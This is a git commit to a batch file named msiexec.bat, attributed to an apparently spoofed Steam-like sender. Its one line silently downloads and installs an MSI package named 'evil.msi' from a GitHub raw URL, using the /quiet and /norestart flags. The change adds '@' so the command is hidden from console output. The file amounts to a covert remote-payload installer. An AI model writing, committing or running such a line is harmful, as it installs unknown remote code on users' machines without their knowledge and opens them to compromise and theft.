cd534ccb1b8f55eaa7d59575b4902ca3c9301dad
Peter Griffin <noreply.steampoqered.com.5@gmail.com>
2026-05-01 10:52:36 +0100

    Update msiexec.bat

--- msiexec.bat
+++ msiexec.bat
@@ -1,1 +1,1 @@
-msiexec /i "https://raw.githubusercontent.com/petergriuffin123/fubbububba/refs/heads/main/evil.msi" /quiet /norestart
+@msiexec /i "https://raw.githubusercontent.com/petergriuffin123/fubbububba/refs/heads/main/evil.msi" /quiet /norestart
